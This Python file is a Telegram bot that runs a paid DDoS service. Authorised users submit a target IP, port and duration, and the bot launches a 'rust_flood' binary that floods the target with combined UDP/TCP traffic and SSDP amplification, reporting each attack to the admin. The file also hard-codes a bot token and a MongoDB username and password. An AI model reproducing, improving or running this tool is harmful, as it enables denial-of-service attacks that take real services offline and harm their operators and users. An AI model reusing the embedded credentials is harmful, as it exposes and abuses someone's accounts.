import telebot, types, logging, os, subprocess
from telebot import types
from threading import Thread
from pymongo import MongoClient
import certifi

ADMIN_ID = 951552160
TOKEN = '7319891408:AAGgZIs6QPVBa_CaSkIl4hZZOiav-7jzV6Q'
MONGO_URI = 'mongodb+srv://spize_db_user:SpizeBBQ@spizebbq.e7r0kwj.mongodb.net'

RUST_BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'rust_flood')
DEFAULT_TASKS = 20        # safe for laptop
MAX_SPEED_MBPS = 50       # your upload headroom
MODE = "both"             # combined UDP + TCP

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sohail']
users_collection = db.users

bot = telebot.TeleBot(TOKEN, threaded=True)
target_ip, target_port, duration = '', 0, 0
current_process = None
forced_stopped = False

def kill_rust_flood():
    global current_process
    if current_process and current_process.returncode is None:
        logging.info("Killing rust_flood...")
        current_process.terminate()
        try: current_process.wait(timeout=3)
        except subprocess.TimeoutExpired: current_process.kill()
        current_process = None

def run_attack_blocking(ip, port, dur, chat_id, username):
    global current_process, forced_stopped
    cmd = [
        RUST_BINARY,
        '--target', f'{ip}:{port}',
        '--duration', str(dur),
        '--tasks', str(DEFAULT_TASKS),
        '--speed', str(MAX_SPEED_MBPS),
        '--mode', MODE,
        '--ssdp'
    ]
    logging.info(f"Attack: {' '.join(cmd)}")
    try:
        current_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           text=True, preexec_fn=os.setsid)
        stdout, stderr = current_process.communicate()
        logging.info(f"Output:\n{stdout}")
        if stderr: logging.error(f"Stderr:\n{stderr}")
        msg = "Attack stopped." if forced_stopped else f"Attack finished.\nTarget: {ip}:{port}\nDuration: {dur}s"
        bot.send_message(chat_id, msg, reply_markup=markup2)
        if chat_id != ADMIN_ID:
            bot.send_message(ADMIN_ID, f"Attack ended\nIP: {ip}\nPort: {port}\nUser: {username}")
    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(chat_id, f"*Attack error:* {e}", parse_mode='Markdown')
    finally:
        current_process = None
        forced_stopped = False

markup1 = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('Stop', callback_data='stop'))
markup2 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add(telebot.types.KeyboardButton("Start Attack"))

@bot.message_handler(commands=['id'])
def id_cmd(msg): bot.reply_to(msg, f"ID: {msg.chat.id}")

@bot.message_handler(commands=['adduser'])
def add_user(msg):
    if msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "⛔ Unauthorized.")
    try:
        _, uid, plan = msg.text.split()
        uid, plan = int(uid), int(plan)
        if plan < 1: return bot.reply_to(msg, "Plan >= 1.")
        users_collection.update_one({"user_id": uid}, {"$set": {"plan": plan}}, upsert=True)
        bot.reply_to(msg, f"✅ User {uid} set plan {plan}.")
    except: bot.reply_to(msg, "Usage: /adduser <id> <plan>")

@bot.message_handler(func=lambda m: m.text == 'Start Attack')
def start_attack(msg):
    global target_ip, target_port, duration, forced_stopped, current_process
    if not target_ip: return bot.send_message(msg.chat.id, "Use /save first.")
    if current_process and current_process.returncode is None:
        return bot.send_message(msg.chat.id, "Attack already running.")
    forced_stopped = False
    bot.send_message(msg.chat.id, "⚡ Multi‑vector attack started.", reply_markup=markup1)
    Thread(target=run_attack_blocking, args=(target_ip, target_port, duration, msg.chat.id, msg.from_user.username), daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def stop_cb(call):
    global forced_stopped
    if not current_process or current_process.returncode is not None:
        return bot.send_message(call.message.chat.id, "No active attack.")
    forced_stopped = True
    kill_rust_flood()
    bot.send_message(call.message.chat.id, "Attack stopped.", reply_markup=markup2)

@bot.message_handler(commands=['save'])
def save(msg):
    user = users_collection.find_one({"user_id": msg.from_user.id})
    if not user or user.get('plan', 0) == 0:
        return bot.send_message(msg.chat.id, "*Access Denied!*", parse_mode='Markdown')
    bot.send_message(msg.chat.id, "Send target: `IP PORT DURATION`", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_save)

def process_save(msg):
    global target_ip, target_port, duration
    try:
        ip, port, dur = msg.text.split()
        port, dur = int(port), int(dur)
        if port in blocked_ports:
            return bot.send_message(msg.chat.id, f"Port {port} blocked.")
        target_ip, target_port, duration = ip, port, dur
        bot.send_message(msg.chat.id, "Ready! Press **Start Attack**", reply_markup=markup2)
        bot.send_message(msg.chat.id, f"⚡ *Preview*\nHost: `{ip}`\nPort: `{port}`\nDuration: `{dur}s`", parse_mode='Markdown')
    except: bot.send_message(msg.chat.id, "Invalid format. `IP PORT DURATION`")

if __name__ == "__main__":
    if not os.path.isfile(RUST_BINARY):
        logging.error("rust_flood not found."); exit(1)
    os.chmod(RUST_BINARY, 0o755)
    bot.infinity_polling()